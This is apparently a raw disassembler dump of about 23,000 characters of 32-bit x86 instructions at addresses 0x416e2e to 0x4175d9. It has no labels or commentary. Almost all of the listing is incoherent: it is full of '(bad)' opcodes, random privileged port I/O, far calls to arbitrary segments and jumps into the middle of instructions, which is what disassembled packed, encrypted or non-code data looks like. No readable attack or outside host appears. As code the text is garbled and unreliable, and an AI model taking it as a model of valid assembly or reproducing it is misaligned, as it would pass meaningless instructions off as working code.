  416e2e:	test   BYTE PTR [esi-0x39],ah
  416e31:	adc    al,0x82
  416e33:	xchg   ebp,eax
  416e34:	jle    0x416e74
  416e36:	xchg   ebp,eax
  416e37:	sti    
  416e38:	jmp    0x416ea3
  416e3a:	push   ds
  416e3b:	hlt    
  416e3c:	push   esi
  416e3d:	sbb    al,0xc
  416e3f:	(bad)  
  416e40:	xor    ecx,eax
  416e42:	outs   dx,DWORD PTR es:[esi]
  416e44:	retf   
  416e45:	sub    eax,0x3b0916d3
  416e4a:	dec    ebp
  416e4b:	cld    
  416e4c:	xchg   DWORD PTR [ebx-0xb],esi
  416e4f:	out    dx,al
  416e50:	test   eax,0x1d968d7e
  416e55:	jge    0x416ea4
  416e57:	stc    
  416e58:	repnz ins BYTE PTR es:[edi],dx
  416e5a:	gs pop eax
  416e5c:	das    
  416e5d:	pop    ds
  416e5e:	xchg   esi,eax
  416e5f:	cs mov ebp,0x87d57713
  416e65:	rcl    esi,1
  416e67:	mov    ds:0x8718b50a,eax
  416e6c:	adc    BYTE PTR [eax-0x70],0xc4
  416e70:	xlat   BYTE PTR ds:[ebx]
  416e71:	js     0x416eda
  416e73:	sbb    ah,al
  416e75:	push   0xffffffdb
  416e77:	je     0x416e1b
  416e79:	or     dl,al
  416e7b:	mov    eax,ds:0x6eed8e8f
  416e80:	rol    BYTE PTR [ebx],0x74
  416e83:	or     al,0xf8
  416e85:	sub    bl,ch
  416e87:	cmp    al,0x49
  416e89:	dec    esi
  416e8a:	dec    BYTE PTR ds:[ecx-0x37]
  416e8e:	addr16 sub al,bh
  416e91:	dec    ecx
  416e92:	pop    eax
  416e93:	pop    edx
  416e94:	sub    edi,DWORD PTR [eax-0x4d5100e2]
  416e9a:	sar    ebp,cl
  416e9c:	out    0xfe,al
  416e9e:	fld1   
  416ea0:	sub    dh,bh
  416ea2:	push   es
  416ea3:	push   ecx
  416ea4:	mov    ch,0xae
  416ea6:	pusha  
  416ea7:	das    
  416ea8:	scas   al,BYTE PTR es:[edi]
  416ea9:	xor    DWORD PTR [edx],ebp
  416eab:	sbb    edi,DWORD PTR [ecx+0x11e32a3a]
  416eb1:	call   0xbafd:0x2d68167b
  416eb8:	test   BYTE PTR [eax-0x669804f6],dl
  416ebe:	loope  0x416f34
  416ec0:	mov    eax,ds:0x9bcc3156
  416ec5:	mov    dl,0xb9
  416ec7:	out    dx,eax
  416ec8:	sbb    al,0x3c
  416eca:	add    BYTE PTR [esi+0x14149429],bh
  416ed0:	in     eax,dx
  416ed1:	sbb    esp,ebp
  416ed3:	xor    bl,dl
  416ed5:	push   esp
  416ed6:	lods   al,BYTE PTR ds:[esi]
  416ed7:	adc    al,0xfe
  416ed9:	sbb    dl,dh
  416edb:	retf   
  416edc:	icebp  
  416edd:	push   0x4f8b9abf
  416ee2:	inc    esp
  416ee3:	lods   al,BYTE PTR ds:[esi]
  416ee4:	sbb    DWORD PTR [eax],eax
  416ee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ee7:	test   bl,bh
  416ee9:	mov    ebx,0x348dffcc
  416eee:	mov    cl,0xf5
  416ef0:	fidivr WORD PTR [ebx-0x144aed29]
  416ef6:	cmp    bl,BYTE PTR [edi+0x43]
  416ef9:	jae    0x416e88
  416efb:	in     al,0x5b
  416efd:	dec    edx
  416efe:	pop    ds
  416eff:	ret    0x8
  416f02:	test   al,0x1e
  416f04:	xchg   esi,eax
  416f05:	adc    ebp,ebx
  416f07:	test   DWORD PTR [esp+ebp*2-0x12],ebx
  416f0b:	div    esi
  416f0d:	(bad)  
  416f0e:	cmp    DWORD PTR [eax-0x65de672],ecx
  416f14:	daa    
  416f15:	dec    ecx
  416f16:	mov    esp,0x6471380f
  416f1b:	inc    edi
  416f1c:	jecxz  0x416f8f
  416f1e:	(bad)  [eax+0x39]
  416f21:	jb     0x416f60
  416f23:	lds    esi,FWORD PTR [ebp+0x6a0a7077]
  416f29:	scas   al,BYTE PTR es:[edi]
  416f2a:	mov    esp,0x3552fc79
  416f2f:	out    dx,eax
  416f30:	xchg   BYTE PTR [esi-0x26],cl
  416f33:	mov    ebx,0xded75590
  416f38:	jl     0x416fb8
  416f3a:	out    dx,eax
  416f3b:	pop    edi
  416f3c:	cwde   
  416f3d:	jns    0x416f18
  416f3f:	iret   
  416f40:	push   0xa4e55dc1
  416f45:	loope  0x416ecd
  416f47:	dec    eax
  416f48:	adc    DWORD PTR [eax-0x82b58f7],eax
  416f4e:	iret   
  416f4f:	xchg   ebp,eax
  416f50:	inc    edi
  416f51:	in     eax,dx
  416f52:	cwde   
  416f53:	and    DWORD PTR [esp+eax*8+0x58],0xffffff8f
  416f58:	ins    DWORD PTR es:[edi],dx
  416f59:	or     BYTE PTR [ecx+edi*2+0x28],0x13
  416f5e:	loopne 0x416f34
  416f60:	cs mov eax,0xe6b30811
  416f66:	add    eax,0x9dea5eaa
  416f6b:	mov    ah,0x8c
  416f6d:	clc    
  416f6e:	sub    DWORD PTR [edx],esi
  416f70:	imul   esp,DWORD PTR [ebp+0x78cf0df6],0xd29e4ff
  416f7a:	ins    DWORD PTR es:[edi],dx
  416f7b:	int3   
  416f7c:	mov    ecx,0xd44b2097
  416f81:	or     ah,dl
  416f83:	pop    ss
  416f84:	pop    ss
  416f85:	lods   eax,DWORD PTR ds:[esi]
  416f86:	jl     0x416fa9
  416f88:	cld    
  416f89:	mov    eax,ds:0x112ad384
  416f8e:	leave  
  416f8f:	add    dl,BYTE PTR [ecx-0x2b]
  416f92:	mov    BYTE PTR [eax+0x8580f7b],dh
  416f98:	pop    ds
  416f99:	outs   dx,DWORD PTR ds:[esi]
  416f9a:	repz and cl,ah
  416f9d:	mov    dl,BYTE PTR [edi]
  416f9f:	loopne 0x416f3e
  416fa1:	iret   
  416fa2:	push   edi
  416fa3:	leave  
  416fa4:	in     eax,dx
  416fa5:	dec    ebx
  416fa6:	stos   BYTE PTR es:[edi],al
  416fa7:	aaa    
  416fa8:	lahf   
  416fa9:	or     ah,cl
  416fab:	push   es
  416fac:	push   0xe
  416fae:	cli    
  416faf:	mov    al,0x46
  416fb1:	(bad)
  416fb6:	call   0x8765:0xe383f02a
  416fbd:	mov    cl,0xbd
  416fbf:	or     esp,esi
  416fc1:	lods   al,BYTE PTR ds:[esi]
  416fc2:	mov    bh,0xb5
  416fc4:	inc    edx
  416fc5:	jp     0x416fa4
  416fc7:	or     dh,BYTE PTR [eax]
  416fc9:	xchg   esp,eax
  416fca:	mov    esi,0xd9f99cf8
  416fcf:	in     al,dx
  416fd0:	xchg   ecx,eax
  416fd1:	cwde   
  416fd2:	push   edx
  416fd3:	loop   0x417004
  416fd5:	iret   
  416fd6:	mov    ebp,0x25ebf3fd
  416fdb:	call   0x1c86:0x7988ff9b
  416fe2:	mov    ch,BYTE PTR [ebx+0x29]
  416fe5:	or     al,0xc6
  416fe7:	std    
  416fe8:	loopne 0x417001
  416fea:	jp     0x417012
  416fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fed:	in     eax,0xec
  416fef:	lock adc BYTE PTR [ebp+edi*4-0x30],dh
  416ff4:	dec    ebx
  416ff5:	mov    dl,0xc1
  416ff7:	enter  0x48c5,0xd2
  416ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ffc:	inc    ecx
  416ffd:	push   esi
  416ffe:	inc    esi
  416fff:	mul    BYTE PTR [esi]
  417001:	xlat   BYTE PTR ds:[ebx]
  417002:	inc    eax
  417003:	push   ebx
  417004:	fidiv  WORD PTR [ebp-0x10a0eea0]
  41700a:	cs jno 0x417039
  41700d:	ja     0x41707b
  41700f:	mov    BYTE PTR [ecx+ecx*2],cl
  417012:	xor    ecx,edi
  417014:	inc    ecx
  417015:	std    
  417016:	add    DWORD PTR [edx-0x61],ebp
  417019:	adc    ebp,DWORD PTR [edx]
  41701b:	lds    edx,FWORD PTR [ebp-0x22]
  41701e:	fadd   st,st(2)
  417020:	cmp    BYTE PTR [ebp-0x48],bl
  417023:	das    
  417024:	lahf   
  417025:	xlat   BYTE PTR ds:[ebx]
  417026:	dec    eax
  417027:	push   ds
  417028:	inc    edx
  417029:	sbb    eax,0x20588d92
  41702e:	stos   BYTE PTR es:[edi],al
  41702f:	mov    eax,ds:0x2a50021c
  417034:	push   ebp
  417035:	and    DWORD PTR [esi+0x117ed3b2],0xbf389cf8
  41703f:	cmp    eax,0x66458f72
  417044:	lods   eax,DWORD PTR ds:[esi]
  417045:	xchg   esi,eax
  417046:	(bad)  
  417047:	mov    esi,0x346e6aad
  41704c:	push   ebx
  41704d:	and    al,0x8b
  41704f:	cmp    ah,BYTE PTR [eax]
  417051:	mov    BYTE PTR [ecx-0x3d],bh
  417054:	cmp    eax,0x1841d9a4
  417059:	lods   al,BYTE PTR ds:[esi]
  41705a:	push   ss
  41705b:	push   es
  41705c:	or     eax,0x4e45aac8
  417061:	add    DWORD PTR [ebp+ecx*2+0x6d],edi
  417065:	mov    esi,0x6e5e508
  41706a:	xchg   BYTE PTR [ebx-0x17],dl
  41706d:	mov    eax,0x5d803f96
  417072:	scas   al,BYTE PTR es:[edi]
  417073:	jns    0x4170c7
  417075:	dec    esp
  417076:	push   ss
  417077:	xor    BYTE PTR [ecx-0x5a],bh
  41707a:	in     eax,dx
  41707b:	icebp  
  41707c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41707d:	je     0x417065
  41707f:	test   DWORD PTR [edi+esi*1+0x1a],ecx
  417083:	fadd   QWORD PTR [edx-0x2]
  417086:	xor    esp,DWORD PTR [ecx+0x79]
  417089:	shl    DWORD PTR [eax-0x599ca695],cl
  41708f:	mov    dh,0x5b
  417091:	mov    cl,0x6c
  417093:	test   BYTE PTR ds:0xb0481617,bh
  417099:	jle    0x4170cd
  41709b:	mov    ah,0x2
  41709d:	jb     0x41704f
  41709f:	int    0x8a
  4170a1:	jecxz  0x417081
  4170a3:	rcl    BYTE PTR [esp+esi*4-0x3c],cl
  4170a7:	push   esi
  4170a8:	push   edx
  4170a9:	imul   eax,DWORD PTR [edx+0x7f],0xffffffd4
  4170ad:	cmp    DWORD PTR [edx+0x42],ecx
  4170b0:	mov    eax,0xd7125f84
  4170b5:	adc    DWORD PTR [esi-0x7b315b2],ebx
  4170bb:	inc    eax
  4170bc:	xor    DWORD PTR [ecx],ebx
  4170be:	push   edi
  4170bf:	test   al,0x9b
  4170c1:	cli    
  4170c2:	dec    esp
  4170c3:	add    al,0xe4
  4170c5:	push   ds
  4170c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170c7:	jge    0x417127
  4170c9:	xchg   edi,eax
  4170ca:	xor    BYTE PTR [edx],bh
  4170cc:	les    ecx,FWORD PTR [eax+0x43]
  4170cf:	cmp    eax,0x5eaa60b2
  4170d4:	mov    ds:0x8675890e,al
  4170d9:	mov    ah,0xa5
  4170db:	or     BYTE PTR [eax],bh
  4170dd:	mov    dl,0x7e
  4170df:	mov    ch,0xc3
  4170e1:	test   al,0xb0
  4170e3:	popa   
  4170e4:	data16 or BYTE PTR [ebp+0x1cfc6845],0x83
  4170ec:	fistp  QWORD PTR [edx-0x2e2feb2b]
  4170f2:	jg     0x41714c
  4170f4:	and    DWORD PTR [ebx+esi*8-0xbe735f1],ebx
  4170fb:	and    DWORD PTR [eax+0x17681022],edi
  417101:	in     al,0x3f
  417103:	bnd jp 0x4170f9
  417106:	and    al,0x47
  417108:	push   ecx
  417109:	mov    esi,0x28d4ba46
  41710e:	and    BYTE PTR gs:[ebx-0x62994ec3],ah
  417115:	jmp    0x35bcc95e
  41711a:	inc    ecx
  41711b:	xchg   DWORD PTR ds:0x4065179f,ebx
  417121:	dec    esp
  417122:	mov    bl,0xb8
  417124:	and    bh,dh
  417126:	stc    
  417127:	xchg   DWORD PTR [esp+eax*1-0x7ee2cf73],eax
  41712e:	(bad)  [edi+0x43e84490]
  417134:	nop
  417135:	or     BYTE PTR [esi-0x47],al
  417138:	fcom   QWORD PTR [eax+edi*1+0x2]
  41713c:	int    0x25
  41713e:	into   
  41713f:	sub    eax,0xe78c289a
  417144:	dec    edi
  417145:	shr    esp,cl
  417147:	ret    0x61f8
  41714a:	mov    bl,0x84
  41714c:	jle    0x4170da
  41714e:	call   0x5638db92
  417153:	test   al,0x3c
  417155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417156:	cld    
  417157:	mov    dh,BYTE PTR [ecx+0x535699d8]
  41715d:	ret    
  41715e:	and    edx,edi
  417160:	ror    BYTE PTR [ebx-0x527bfb7e],cl
  417166:	shl    BYTE PTR [edi],1
  417168:	stos   BYTE PTR es:[edi],al
  417169:	mov    ebp,0xf64b1a7a
  41716e:	enter  0x6e25,0xb7
  417172:	cmp    dh,BYTE PTR [eax-0x42fad059]
  417178:	jne    0x417190
  41717a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41717b:	into   
  41717c:	out    0xe3,al
  41717e:	cmp    eax,0x2880e070
  417183:	jg     0x41717a
  417185:	pop    ecx
  417186:	popf   
  417187:	fs xchg edi,eax
  417189:	rol    BYTE PTR [ebp+0x51],1
  41718c:	dec    esi
  41718d:	ret    
  41718e:	cld    
  41718f:	cld    
  417190:	stc    
  417191:	test   BYTE PTR [esi-0x35],bh
  417194:	xlat   BYTE PTR ds:[ebx]
  417195:	lock xchg BYTE PTR [ebx-0x88c5870],ah
  41719c:	ins    BYTE PTR es:[edi],dx
  41719d:	sub    eax,0xa4227101
  4171a2:	(bad)  
  4171a3:	jl     0x417137
  4171a5:	ds inc ebp
  4171a7:	and    esp,edi
  4171a9:	adc    cl,BYTE PTR [ebx-0x7bdff10e]
  4171af:	ins    DWORD PTR es:[edi],dx
  4171b0:	mov    ch,0xc1
  4171b2:	pop    es
  4171b3:	cs pop edi
  4171b5:	inc    esp
  4171b6:	shl    DWORD PTR [esi],1
  4171b8:	stc    
  4171b9:	sub    ah,ah
  4171bb:	sbb    BYTE PTR [ebx+0x49107700],cl
  4171c1:	retf   
  4171c2:	mov    esp,0x7ba1ed4f
  4171c7:	cmovg  ecx,DWORD PTR ds:0x6f9a410c
  4171ce:	mov    eax,0xe53b5d9e
  4171d3:	pop    esp
  4171d4:	inc    ecx
  4171d5:	ds popf 
  4171d7:	jne    0x41718d
  4171d9:	sub    DWORD PTR [ebx],eax
  4171db:	cmp    al,0x36
  4171dd:	dec    DWORD PTR [eax+ecx*2+0x0]
  4171e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171e2:	into   
  4171e3:	stos   BYTE PTR es:[edi],al
  4171e4:	mov    cl,0x1d
  4171e6:	imul   ebx,DWORD PTR [ebp+0x55],0x0
  4171ea:	sub    cl,dh
  4171ec:	fsubp  st(5),st
  4171ee:	mov    esp,?
  4171f0:	jo     0x4171af
  4171f2:	mov    fs,eax
  4171f4:	in     al,dx
  4171f5:	mov    ds:0x60adfc3,al
  4171fa:	lds    eax,FWORD PTR [edi+0x6bae1890]
  417200:	lods   al,BYTE PTR ds:[esi]
  417201:	fcmovbe st,st(4)
  417203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417204:	cmp    ebx,DWORD PTR [edi+eiz*8+0x640e145a]
  41720b:	(bad)  
  41720c:	ins    DWORD PTR es:[edi],dx
  41720d:	xor    dl,dh
  41720f:	push   edi
  417210:	mul    BYTE PTR [edi-0x71]
  417213:	xchg   esi,eax
  417214:	pop    eax
  417215:	ins    BYTE PTR es:[edi],dx
  417216:	lods   eax,DWORD PTR ds:[esi]
  417217:	or     DWORD PTR [eax+ecx*2-0x53],edi
  41721b:	mov    DWORD PTR [ecx-0x720d9910],ebp
  417221:	jns    0x417232
  417223:	sbb    eax,0x455ecd28
  417228:	adc    eax,DWORD PTR [ecx]
  41722a:	pop    esi
  41722b:	test   DWORD PTR [eax-0x14e8470f],ebp
  417231:	movd   DWORD PTR ds:0x7f0b4196,mm1
  417238:	push   ebx
  417239:	mov    esi,0x759b5504
  41723e:	dec    edi
  41723f:	inc    ebp
  417240:	sar    DWORD PTR [edx+0xc45b796],0xc0
  417247:	aas    
  417248:	mov    al,ds:0xb19c2665
  41724d:	mov    edx,0xb225d460
  417252:	retf   0x6932
  417255:	inc    edi
  417256:	jmp    0x417219
  417258:	mov    edx,0xff0ea245
  41725d:	push   ds
  41725e:	xor    al,0x50
  417260:	fisubr DWORD PTR [esi+eiz*4]
  417263:	out    0x1b,eax
  417265:	jp     0x417227
  417267:	std    
  417268:	push   esp
  417269:	or     BYTE PTR [eax-0x5a],bh
  41726c:	jg     0x417223
  41726e:	stos   BYTE PTR es:[edi],al
  41726f:	jo     0x41720d
  417271:	xchg   esi,eax
  417272:	mov    dh,cl
  417274:	clc    
  417275:	xor    esi,edi
  417277:	push   esp
  417278:	xchg   DWORD PTR [ebp-0x2e],ebp
  41727b:	xor    DWORD PTR [esi-0x226c2f6e],ebx
  417281:	ror    DWORD PTR [eax-0x6f],cl
  417284:	repz mov esi,0x4f62f1b9
  41728a:	lods   eax,DWORD PTR ds:[esi]
  41728b:	or     edi,DWORD PTR [ebp-0x5d]
  41728e:	out    dx,al
  41728f:	enter  0xcb51,0xe6
  417293:	jecxz  0x417224
  417295:	jge    0x41727a
  417297:	popf   
  417298:	dec    edi
  417299:	jmp    0x4172d0
  41729b:	js     0x417253
  41729d:	scas   eax,DWORD PTR es:[edi]
  41729e:	pusha  
  41729f:	out    0x59,al
  4172a1:	out    dx,al
  4172a2:	push   ecx
  4172a3:	sahf   
  4172a4:	ret    0x2d34
  4172a7:	xor    al,0x47
  4172a9:	popf   
  4172aa:	mov    ah,0x37
  4172ac:	add    DWORD PTR [esi+0x841d209],edi
  4172b2:	int3   
  4172b3:	jmp    0x3fb2a1a1
  4172b8:	mov    WORD PTR [edx],es
  4172ba:	int    0x97
  4172bc:	add    bh,BYTE PTR [ebx-0x14]
  4172bf:	xchg   ecx,eax
  4172c0:	dec    edx
  4172c1:	lods   eax,DWORD PTR ds:[esi]
  4172c2:	or     edi,esp
  4172c4:	mov    edi,0x4d1f5597
  4172c9:	and    eax,0xa6e0792d
  4172ce:	mov    al,ds:0x663bc3cd
  4172d3:	bound  edx,QWORD PTR [ecx+ebp*4-0x32]
  4172d7:	xchg   ecx,eax
  4172d8:	out    dx,al
  4172d9:	pop    eax
  4172da:	rcr    DWORD PTR [esi-0x5c],0xb0
  4172de:	test   al,0x9d
  4172e0:	data16 arpl sp,cx
  4172e3:	out    dx,al
  4172e4:	add    BYTE PTR [ecx],0x42
  4172e7:	int3   
  4172e8:	stc    
  4172e9:	fstp   TBYTE PTR [ebp+0x136ae890]
  4172ef:	or     dh,BYTE PTR [eax-0x14]
  4172f2:	inc    ecx
  4172f3:	retf   0xcf17
  4172f6:	push   ds
  4172f7:	or     eax,0xea445dce
  4172fc:	adc    ah,dl
  4172fe:	call   0x36489589
  417303:	cdq    
  417304:	rcl    DWORD PTR [edi+0x62904a7e],cl
  41730a:	pop    edx
  41730b:	dec    ebx
  41730c:	sub    bl,ah
  41730e:	lea    ecx,[edi+0x386f1240]
  417314:	sub    eax,0xb28f41fe
  417319:	jbe    0x4172dc
  41731b:	pusha  
  41731c:	fs retf 0xd13c
  417320:	test   al,0xdb
  417322:	adc    eax,0x506778b8
  417327:	dec    ebx
  417328:	push   cs
  417329:	add    eax,0x288a2431
  41732e:	pop    eax
  41732f:	pop    es
  417330:	jg     0x4172b9
  417332:	pop    eax
  417333:	int    0x73
  417335:	loope  0x417335
  417337:	cmp    ebp,DWORD PTR fs:[ebx-0x71]
  41733b:	test   ch,bl
  41733d:	and    al,BYTE PTR [bp+si-0x1c89]
  417342:	xlat   BYTE PTR ds:[ebx]
  417343:	cwde   
  417344:	addr16 jge 0x417387
  417347:	ins    BYTE PTR es:[edi],dx
  417348:	and    DWORD PTR [esp],0x4004b7db
  41734f:	out    dx,al
  417350:	dec    esi
  417351:	pop    es
  417352:	push   ebp
  417353:	in     eax,0x7f
  417355:	xor    al,cl
  417357:	pop    ebx
  417358:	mov    ebp,0x840d75ac
  41735d:	cmp    BYTE PTR [eax-0x2d],cl
  417360:	sahf   
  417361:	addr16 dec ecx
  417363:	mov    ebp,DWORD PTR [edx+0x7cf13fd8]
  417369:	xor    eax,0x8c5094ab
  41736e:	mov    edi,0x30c3144f
  417373:	ficomp WORD PTR [ecx+ebp*8-0x739fba67]
  41737a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41737b:	xor    edi,ebx
  41737d:	and    al,0xf9
  41737f:	inc    ebx
  417380:	enter  0x5058,0x7d
  417384:	xor    al,0xc7
  417386:	(bad)  
  417387:	cmp    DWORD PTR [eax-0x7f],ecx
  41738a:	gs ins DWORD PTR es:[edi],dx
  41738c:	ja     0xc9879281
  417392:	and    DWORD PTR [edi],ebx
  417394:	push   ebx
  417395:	pop    esi
  417396:	in     al,0x80
  417398:	outs   dx,BYTE PTR ds:[esi]
  417399:	test   ecx,esp
  41739b:	loopne 0x4173f1
  41739d:	xor    cl,dh
  41739f:	repnz pop eax
  4173a1:	xor    dh,BYTE PTR [ecx]
  4173a3:	loopne 0x4173e7
  4173a5:	pop    esp
  4173a6:	dec    edx
  4173a7:	mov    BYTE PTR [eax-0x23],al
  4173aa:	jns    0x417381
  4173ac:	inc    esp
  4173ad:	pop    ebx
  4173ae:	sahf   
  4173af:	xor    DWORD PTR [ebx+0x34],esi
  4173b2:	jg     0x41740d
  4173b4:	jb     0x4173f0
  4173b6:	mov    eax,0x777d2f9
  4173bb:	dec    ecx
  4173bc:	das    
  4173bd:	push   ebx
  4173be:	js     0x417348
  4173c0:	in     al,0xd3
  4173c2:	and    al,0xd4
  4173c4:	push   ebp
  4173c5:	mov    ds:0x9fc24192,eax
  4173ca:	cmp    DWORD PTR [eax-0x2339b960],ebp
  4173d0:	fs arpl cx,dx
  4173d3:	call   0x7e37:0xd13cb87c
  4173da:	sub    DWORD PTR [edx+0x34],eax
  4173dd:	sbb    DWORD PTR [ebp+ebp*1-0x10],ecx
  4173e1:	jp     0x417381
  4173e3:	pop    eax
  4173e4:	pop    ss
  4173e5:	pop    ds
  4173e6:	repnz xor eax,0x5854c150
  4173ec:	je     0x41739b
  4173ee:	hlt    
  4173ef:	adc    eax,0x6dbe96db
  4173f4:	mov    ecx,0x72f58e17
  4173f9:	mov    ebx,0x53d28ddb
  4173fe:	shl    ebp,1
  417400:	sahf   
  417401:	mov    ds:0x4c0b4e63,al
  417406:	and    ecx,ecx
  417408:	push   ebp
  417409:	nop
  41740a:	scas   eax,DWORD PTR es:[edi]
  41740b:	dec    ecx
  41740c:	xchg   edx,eax
  41740d:	(bad)  
  41740e:	push   ecx
  41740f:	add    eax,0x72e126a1
  417414:	dec    ebp
  417415:	retf   
  417416:	icebp  
  417417:	je     0x4173ce
  417419:	push   ebx
  41741a:	aas    
  41741b:	push   edi
  41741c:	data16 fiadd WORD PTR [ecx]
  41741f:	popf   
  417420:	xchg   esi,eax
  417421:	sub    edx,DWORD PTR [edi]
  417423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417424:	pusha  
  417425:	sbb    al,0xb5
  417427:	je     0x41740c
  417429:	adc    BYTE PTR [esp+ebx*4-0x3e8ae936],ch
  417430:	ss pop esp
  417432:	loopne 0x41748b
  417434:	push   esi
  417435:	push   esp
  417436:	nop
  417437:	lahf   
  417438:	mov    bl,0xd4
  41743a:	test   BYTE PTR [ebx],dl
  41743c:	pop    es
  41743d:	shl    DWORD PTR [ecx],cl
  41743f:	dec    esp
  417440:	mov    dh,0x6e
  417442:	sub    al,0x78
  417444:	cld    
  417445:	pop    es
  417446:	mov    ebx,0x12bd9783
  41744b:	or     BYTE PTR [ebx+0x25],bl
  41744e:	dec    ebx
  41744f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417450:	aaa    
  417451:	jmp    0x41741d
  417453:	aaa    
  417454:	dec    edx
  417455:	pop    ebx
  417456:	sbb    eax,0x29a769a9
  41745b:	cmp    esp,ebx
  41745d:	jmp    0xf4:0x789fdb27
  417464:	sbb    DWORD PTR ds:0x8763687,0x31106d3e
  41746e:	aas    
  41746f:	or     ah,BYTE PTR [edx-0x26]
  417472:	jno    0x417435
  417474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417475:	add    DWORD PTR [ecx],ebp
  417477:	inc    eax
  417478:	test   DWORD PTR [eax+0x185d1bc5],0xd5dda493
  417482:	dec    esi
  417483:	out    dx,eax
  417484:	sub    DWORD PTR [edx+0x25],edi
  417487:	or     eax,0x51d618a1
  41748c:	cmp    bl,BYTE PTR [edi+eax*2+0x59]
  417490:	(bad)  
  417491:	aad    0xdb
  417493:	imul   edi,esp,0x36061b5
  417499:	dec    eax
  41749a:	push   esp
  41749b:	rcl    BYTE PTR [ecx+edx*1+0x26],cl
  41749f:	pop    esi
  4174a0:	add    eax,0xd2737f57
  4174a5:	bound  esp,QWORD PTR [edx-0x43]
  4174a8:	xchg   bl,dl
  4174aa:	pop    es
  4174ab:	push   ebx
  4174ac:	je     0x41749a
  4174ae:	inc    esi
  4174af:	pop    ebp
  4174b0:	pop    esi
  4174b1:	iret   
  4174b2:	bswap  ebp
  4174b4:	out    0x44,al
  4174b6:	loopne 0x4174dd
  4174b8:	xchg   ebx,eax
  4174b9:	jnp    0x417495
  4174bb:	enter  0xa53b,0xc8
  4174bf:	pop    esp
  4174c0:	sbb    BYTE PTR [ebx-0x4dde8374],0xac
  4174c7:	xchg   ecx,eax
  4174c8:	mov    esi,DWORD PTR [eax]
  4174ca:	sub    dl,dl
  4174cc:	aam    0xfe
  4174ce:	inc    ecx
  4174cf:	sub    ah,0xc9
  4174d2:	mov    DWORD PTR ds:0xdd27c12c,ebx
  4174d8:	jne    0x417470
  4174da:	mov    al,0xb5
  4174dc:	mov    eax,ds:0x8def37ab
  4174e1:	cmc    
  4174e2:	neg    ecx
  4174e4:	outs   dx,BYTE PTR ds:[esi]
  4174e5:	sub    dh,al
  4174e7:	mov    dh,bh
  4174e9:	xor    edi,DWORD PTR [ebx-0x58]
  4174ec:	daa    
  4174ed:	aas    
  4174ee:	leave  
  4174ef:	push   0x7bcc12a0
  4174f4:	jp     0x4174c7
  4174f6:	stos   BYTE PTR es:[edi],al
  4174f7:	push   0x3f
  4174f9:	je     0x4174bd
  4174fb:	sub    DWORD PTR [esp+ebp*1],ebp
  4174fe:	pop    ss
  4174ff:	or     eax,ecx
  417501:	mov    ecx,0xa8661542
  417506:	push   esi
  417507:	arpl   cx,dx
  417509:	aad    0xc4
  41750b:	iret   
  41750c:	repz add ah,BYTE PTR [esi+0x37]
  417510:	std    
  417511:	push   eax
  417512:	out    0x42,al
  417514:	out    dx,al
  417515:	lods   eax,DWORD PTR ds:[esi]
  417516:	es pusha 
  417518:	outs   dx,DWORD PTR ds:[esi]
  417519:	push   cs
  41751a:	int3   
  41751b:	in     al,dx
  41751c:	xchg   BYTE PTR [ebx],bl
  41751e:	inc    esi
  41751f:	push   esi
  417520:	and    eax,0xa322db57
  417525:	jle    0x41750e
  417527:	mov    ds:0x7c4fc166,eax
  41752c:	adc    ebx,ecx
  41752e:	iret   
  41752f:	jno    0x417525
  417531:	cmp    eax,DWORD PTR [edi]
  417533:	xchg   esi,eax
  417534:	xchg   BYTE PTR [ebx+ecx*2-0x16],dh
  417538:	inc    eax
  417539:	adc    eax,0xe4a8723e
  41753e:	fstp   QWORD PTR [ebx+eiz*4+0x41cee1a6]
  417545:	xchg   esi,eax
  417546:	lea    esi,[edx]
  417548:	mov    BYTE PTR [esi-0x45],cl
  41754b:	xchg   esi,eax
  41754c:	mov    dl,BYTE PTR [edx]
  41754e:	and    BYTE PTR [eax-0x77],ah
  417551:	jnp    0x417554
  417553:	add    edi,eax
  417555:	mov    al,ds:0x1527bb7f
  41755a:	inc    ebx
  41755b:	rcl    BYTE PTR [ebp-0x11e11518],cl
  417561:	xchg   edi,eax
  417562:	xor    BYTE PTR [ebx],cl
  417564:	cmp    ebx,DWORD PTR [esp+edx*4-0x5d]
  417568:	test   DWORD PTR [eax+0x45a63e9c],ebx
  41756e:	jnp    0x41756f
  417570:	stos   DWORD PTR es:[edi],eax
  417571:	and    edx,DWORD PTR [ebp+0x59]
  417574:	(bad)  
  417575:	xchg   ebx,eax
  417576:	xchg   edi,eax
  417577:	mul    DWORD PTR fs:[esi+0x2d]
  41757b:	mov    eax,0x5a5a368e
  417580:	cmp    cl,dl
  417582:	adc    al,BYTE PTR [esi+0x1e]
  417585:	ja     0x417516
  417587:	imul   ecx,DWORD PTR [edi],0xffffff89
  41758a:	or     eax,0x2e4edd32
  41758f:	adc    esi,DWORD PTR [esi-0x7672d6a1]
  417595:	sbb    al,0x49
  417597:	mov    ebp,0x4ef0d829
  41759c:	cwde   
  41759d:	fadd   DWORD PTR ds:0xa98b41ce
  4175a3:	cdq    
  4175a4:	loop   0x41756f
  4175a6:	ret    0x4bb4
  4175a9:	or     BYTE PTR [esi+0x12f2bee6],ch
  4175af:	sub    BYTE PTR [ecx-0x336feb82],ah
  4175b5:	adc    bh,BYTE PTR [eax]
  4175b7:	mov    BYTE PTR ss:[eax+0x55],ch
  4175bb:	jge    0x4175d7
  4175bd:	lea    edx,[esi-0x10]
  4175c0:	inc    ebx
  4175c1:	outs   dx,BYTE PTR ds:[esi]
  4175c2:	cwde   
  4175c3:	sbb    DWORD PTR [ecx],edx
  4175c5:	dec    esp
  4175c6:	cmp    ebx,DWORD PTR [edx+0x5566482b]
  4175cc:	es or  dl,bl
  4175cf:	in     al,dx
  4175d0:	mov    eax,ds:0x619ba87e
  4175d5:	outs   dx,BYTE PTR ds:[esi]
  4175d6:	ret    0x1638
  4175d9:	xchg   edx,eax
